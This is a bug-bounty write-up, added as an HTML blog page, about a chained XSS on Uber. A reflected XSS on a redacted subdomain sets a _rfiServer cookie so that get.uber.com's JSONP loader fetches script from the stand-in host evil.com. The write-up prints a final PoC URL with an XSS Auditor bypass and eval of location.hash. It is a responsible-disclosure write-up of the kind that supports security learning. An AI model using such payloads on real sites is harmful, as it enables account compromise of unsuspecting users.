@@ -1,0 +1,142 @@
+<!DOCTYPE html>
+<html lang="">
+	<meta charset="UTF-8">
+<!-- <link rel="icon" type="image/x-icon" href="/statics/img/favicon.ico"> -->
+<title>
+	
+		Uber XSS via Cookie -
+	
+	Symbo1
+</title>
+
+<meta name="theme-color" content="#232323">
+<meta name="description" content="">
+<meta name="keywords" content="">
+<meta name="author" content="Tr3jer_CongRong.">
+<link rel="alternate" type="application/rss+xml" title="Tr3jer_CongRong.'s RSS Feed" href="/rss.xml">
+<link rel="alternate" type="application/atom+xml" title="Tr3jer_CongRong.'s Atom Feed" href="/atom.xml">
+<link rel="stylesheet" type="text/css" href="/statics/css/style.css">
+<link rel="license" type="text/plain" src="/statics/LICENSE">
+
+
+
+	<body>
+		<header>
+	<pre class="ascii name">
+  ____                        _               _ 
+ / ___|   _   _   _ __ ___   | |__     ___   / |
+ \___ \  | | | | | '_ ` _ \  | '_ \   / _ \  | |
+  ___) | | |_| | | | | | | | | |_) | | (_) | | |
+ |____/   \__, | |_| |_| |_| |_.__/   \___/  |_|
+          |___/                                 
+          	Security Team.
+	</pre>
+</header>
+		<nav>
+	<ul>
+		<li><a href="/">Index</a></li>&nbsp;&nbsp;|
+		<li><a href="/acknowledgement">Acknowledgement</a></li>&nbsp;&nbsp;|
+		<li><a href="/archives">Archives</a></li>&nbsp;&nbsp;|
+		<li><a href="/projects">Projects</a></li>&nbsp;&nbsp;|
+		<li><a href="/members">Members</a></li>&nbsp;&nbsp;|
+		<li><a href="/about">About</a></li>
+		<!-- <li><a href="/rss.xml">RSS</a>/<a href="/atom.xml">Atom</a></li> -->
+	</ul>
+</nav>
+
+		<main>
+			<div class="post-content">
+<div id="post">
+  <h1 align="center">Uber XSS via Cookie</h1>
+<p align="right" class="date">30 Aug 2017 - zhchbin</p>
+
+<p>   This write up is about part of my latest XSS report to Uber@hackerone. Sorry for my poor English first of all, I will try my best to explain this XSS problem throughly.</p>
+
+<h2 id="jsonp-request">JSONP Request</h2>
+
+<p>   Several months ago, when enjoying my Spring Festival Holiday at home, I decided to do something interesting, so I started hunting for a bug. I like searching in the chrome dev tools. This time my lucky word was jsonp, and my target domain was <code class="highlighter-rouge">https://get.uber.com</code>. Let’s look at what I had found at that time.</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>idrCall: function() {
+    var a, b;
+    return this.idrCallPending ? void 0 : (this.log("making idr call"),
+    a = this.rfiServer ? this.rfiServer : "a.rfihub.com",
+    b = this.getProtocol() + "//" + a + "/idr.js",
+    this.jsonpGet(b, {}, this.idrCallback, "cmZpSWRJbkNhY2hl"),
+    this.idrCallPending = !0)
+},
+</code></pre></div></div>
+
+<p><img src="http://wx1.sinaimg.cn/mw690/9c5c5d93ly1fxqe8cbagsj21d00r0gsw.jpg" /></p>
+
+<p>   Nothing suspicious? Not! When came cross these lines of code, I was thinking about whether the value of <code class="highlighter-rouge">this.rfiServer</code> could be controlled by me. If yes, we can force the browser to load arbitrary javascript file. To understand this, you should know the essence of JSONP. The next step was searching everything about <code class="highlighter-rouge">rfiServer</code>.</p>
+
+<p><img src="http://wx3.sinaimg.cn/mw690/9c5c5d93ly1fxqe84lvb3j20tm0f042c.jpg" /></p>
+
+<p>After reading through these lines of code:</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>a = this.readCookie("_rfiServer"),
+null != a &amp;&amp; this.setRfiServer(a),
+</code></pre></div></div>
+
+<p>   We could get the information that the initial value of <code class="highlighter-rouge">this.rfiServer</code> was set by using value of cookie <code class="highlighter-rouge">_rfiServer</code> if exists. Now the problem became how we can set cookie of Uber sites? But how? Here was the options in my mind at that time:</p>
+
+<ul>
+  <li>HTTP Header CRLF Injection at any subdomain of uber.com</li>
+  <li>XSS at any subdomain of uber.com</li>
+</ul>
+
+<p>What? We need to find a bug to trigger another bug. And why any subdomain of uber.com?</p>
+
+<h2 id="the-feature-of-cookie">The Feature of Cookie</h2>
+
+<p>   Any subdomain of uber.com can set cookie with domain <code class="highlighter-rouge">.uber.com</code> to be used across subdomains. For instance, we can set cookie in <code class="highlighter-rouge">xxx.uber.com</code> using following code, then <code class="highlighter-rouge">get.uber.com</code> will use the cookie value.</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>document.cookie = '_rfiServer=evil.com;domain=.uber.com;expires=Sat, 27 Jan 2018 01:43:57 GMT;path=/'
+</code></pre></div></div>
+
+<p><img src="http://wx1.sinaimg.cn/mw690/9c5c5d93ly1fxqe87abluj20yt0u0qel.jpg" /></p>
+
+<h2 id="xss-of-ubercom-which-is-out-of-scope">XSS of .uber.com which is Out of Scope</h2>
+
+<p>I did really find out one reflected XSS in one of Uber’s subdomain using search engine. Let’s call the domain <code class="highlighter-rouge">&lt;redacted&gt;.uber.com</code> for demo.</p>
+
+<p><img src="http://wx4.sinaimg.cn/mw690/9c5c5d93ly1fxqe89pzq4j21dw0fy79z.jpg" /></p>
+
+<ol>
+  <li><code class="highlighter-rouge">"</code> is reflected and not encoded. We can inject any attribution into <code class="highlighter-rouge">input</code> tag.</li>
+  <li><code class="highlighter-rouge">type="text"</code> is after the injection point. So we can inject <code class="highlighter-rouge">type="image" src="1" onerror="alert(1)"</code>. Note that when there is two types, the second one will be ignored.</li>
+  <li><code class="highlighter-rouge">&gt;</code> is removed!!! This can be used to bypass Chrome XSS Auditor. How? <code class="highlighter-rouge">o&gt;nerror.</code></li>
+</ol>
+
+<h2 id="summary">Summary</h2>
+
+<ol>
+  <li>Use reflected XSS of <code class="highlighter-rouge">&lt;redacted&gt;.uber.com</code> to set the value of <code class="highlighter-rouge">_rfiServer </code>cookie to <code class="highlighter-rouge">evil.com</code></li>
+  <li>Visit <code class="highlighter-rouge">get.uber.com</code>, JSONP request to <code class="highlighter-rouge">https://evil.com/idr.js</code>, XSS of <code class="highlighter-rouge">get.uber.com</code> is done.</li>
+  <li>The final PoC</li>
+</ol>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>https://&lt;redacted&gt;.uber.com/&lt;redacted&gt;?
+email=aaa"%20type%3d"image"%20src%3d1%20o&gt;nerror%3d"eval(decodeURIComponent(location.hash.substr(1)))
+#document.cookie='_rfiServer=evil.com;domain=.uber.com;expires=Sat, 27 Jan 2999 01:43:57 GMT;path=/';location.href="https://get.uber.com";
+</code></pre></div></div>
+
+<p>Thanks for Uber. Reward: 5k</p>
+
+
+</div>
+</div>
+
+<div style="display: none;">
+	<script src="https://s5.cnzz.com/z_stat.php?id=1275488238&web_id=1275488238" language="JavaScript"></script>
+</div>
+		</main>
+		<!-- <footer>
+
+</footer>
+ -->
+		<div style="display: none;">
+        	<script src="https://s5.cnzz.com/z_stat.php?id=1275488238&web_id=1275488238" language="JavaScript"></script>
+    	</div>
+	</body>
+</html>
